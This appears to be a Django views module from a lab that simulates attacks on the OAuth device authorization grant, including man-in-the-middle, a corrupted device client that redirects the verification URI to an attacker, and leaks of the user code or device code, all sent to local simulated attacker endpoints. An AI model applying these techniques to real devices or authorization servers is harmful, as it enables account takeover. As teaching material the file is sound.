from django.db.utils import OperationalError
from django.urls.base import reverse
from django.http.response import HttpResponseForbidden, JsonResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.urls import reverse
from .models import DeviceGrant
from .tasks import polling
from configuration.models import config_object
import requests
from urllib.parse import urlencode, parse_qs
import logging

logger = logging.getLogger(__name__)
HEADERS = {'Content-type': 'application/x-www-form-urlencoded'}


def index(request):
    """Returns HTML page with client device user interface
    """
    device_name = "Bob Inc. Streamingbox"
    if 'attacker_device_name' in request.POST.keys():
        device_name = request.POST['attacker_device_name']
    return render(request, 'device/index.html', {'device_name': device_name})


@csrf_exempt
def grant(request):
    """Initiates a device grant on the device.

    Obtains client_id from AS, initiates device grant and access_token polling.
    Depending on attack scenarios some configurations are implemented here.

    Returns:
        HttpResponse: JSON response with error message or data needed in order for a user \
            to authorize the grant
    """
    if request.method == 'POST':
        config = config_object()
        server_address = "/authorization-server/"
        if config_object().attack_choice == "mitm":
            server_address = "/attacker/"
        elif config_object().attack_choice == "cdc":
            # Attacker intercepts all messages from device
            server_address = "/attacker/"

        # Get client_id from Authorization Server
        device_name = "Bob Inc. Streamingbox"
        if 'attacker_device_name' in request.POST.keys():
            device_name = request.POST['attacker_device_name']
        logger.warning("Get client_id from Alice Services.\ndevice_name: " 
                       + device_name)
        response = requests.post(
            request.build_absolute_uri(server_address + 'get-client-id'),
            headers=HEADERS,
            data={'device_name': device_name})
        if response.status_code == 503:
            data = {'error_message': 'Service Unavailable. Please try again later.'}
            return JsonResponse(data=data)
        elif not response.ok:
            logger.error("Error during client_id request to Alice-AS.")
            data = {'error_message': 'Something went wrong. Could not register \
                        at Alice Services. Please try again later.'}
            return JsonResponse(data=data)

        client_id = parse_qs(response.text).get('client_id')[0]

        # Register device for device grant
        # Set scope
        if config.attack_choice == 'csrfqr' or config.attack_choice == 'rp' \
                or config.attack_choice == 'cdc':
            scope = "FULL"
        else:
            scope = "LIMITED"

        logger.warning("Initiate device grant. \n device_name: " +
                       device_name + ", scope: " + scope)

        data = {'client_id': client_id, 'scope': scope}
        response = requests.post(
            request.build_absolute_uri(
                server_address + 'authorization-endpoint'),
            headers=HEADERS,
            data=urlencode(data))
        if response.status_code == 503:
            data = {
                'error_message': 'Service Unavailable. Please try again later.'}
            return JsonResponse(data=data)
        elif not response.ok:
            logger.error("Error during client_id request to Alice-AS.")
            data = {
                'error_message': 'Something went wrong. Could not connect device at Alice Services. Please try again later.'}
        response_data = response.json()

        # Store data in client device db
        device_grant = DeviceGrant(
            device_code=response_data['device_code'],
            client_id=client_id,
            user_code=response_data['user_code'],
            verification_uri=response_data['verification_uri'],
            verification_uri_complete=response_data['verification_uri_complete'],
            user_code_lifetime=int(float(response_data['expires_in'])),
            interval=response_data['interval'],
            scope=scope,
            device_name=device_name)
        while True:
            try:
                device_grant.save(); break
            except OperationalError:
                pass

        if config.attack_choice == "cdc":
            # Corrupted Device Client: device changes verification_uri to
            # Eve's server address
            device_grant.verification_uri = request.build_absolute_uri(
                '/attacker/device')
            device_grant.verification_uri_complete = device_grant.verification_uri + \
                '/' + str(device_grant.user_code)
            while True:
                try:
                    device_grant.save(); break
                except OperationalError:
                    pass

        data = {
            'user_code': device_grant.user_code,
            'verification_uri': device_grant.verification_uri,
            'verification_uri_complete': device_grant.verification_uri_complete,
            'client_id': device_grant.client_id,
            'timeout': config.timeout
        }

        # Leak device_code or user_code depending on scenario
        if config.attack_choice == "ucl":
            if config.ucl_choice == "prox":
                leak_data = {'user_code': device_grant.user_code}
                response = requests.post(
                    request.build_absolute_uri(
                        reverse('attacker:leak-user-code')),
                    headers=HEADERS,
                    data=urlencode(leak_data))

        elif config.attack_choice == "dcl":
            if config.dcl_choice == "prox":
                leak_data = {'device_code': device_grant.device_code,
                             'client_id': device_grant.client_id}
                response = requests.post(
                    request.build_absolute_uri(
                        reverse('attacker:leak-device-code')),
                    headers=HEADERS,
                    data=urlencode(leak_data))
                # set device_code to be shown on device
                data['device_code'] = device_grant.device_code

        # Start polling (asynchronous)
        # client-side JS code periodically checks whether polling successful
        # and shows success once polling completed
        config = config_object()
        if not(config.attack_choice == "cdc" and config.cdc_choice == ""):
            token_endpoint_url = request.build_absolute_uri(
                server_address + 'token-endpoint')
            polling.delay(device_grant.client_id, token_endpoint_url)

        return JsonResponse(data=data)

    else:
        return HttpResponseForbidden()


@csrf_exempt
def grant_successful(request):
    """Endpoint for success polling of device frontend.

    Responds with appropriate states depending on success or errors during grant.

    Returns:
        HttpResponse: JSON with parameter "state" that can be "waiting", "success", \
            "error", "timeout", "service_unavailable"
    """
    if request.method == 'POST':
        client_id = request.POST['client_id']
        # set state parameter
        state = 'waiting'
        if client_id == 'null':
            # only happens during ddos if client registration was unsuccessful due to 503
            state = 'service_unavailable'
        else:
            # loop needed because of IOExceptions in DOS in write access to sqlite3 database
            while True:
                try:
                    device_grant = DeviceGrant.objects.get(
                        client_id=int(client_id))
                    if device_grant.authenticated:
                        state = 'success'
                    elif device_grant.request_denied:
                        state = 'error'
                    elif device_grant.timeout:
                        state = 'timeout'
                    elif device_grant.service_unavailable:
                        state = 'service_unavailable'
                    break
                except DeviceGrant.DoesNotExist:
                    state = 'error'
                    break
                except BaseException:
                    pass
        data = {'state': state}
        return JsonResponse(data=data)
    else:
        return HttpResponseForbidden()
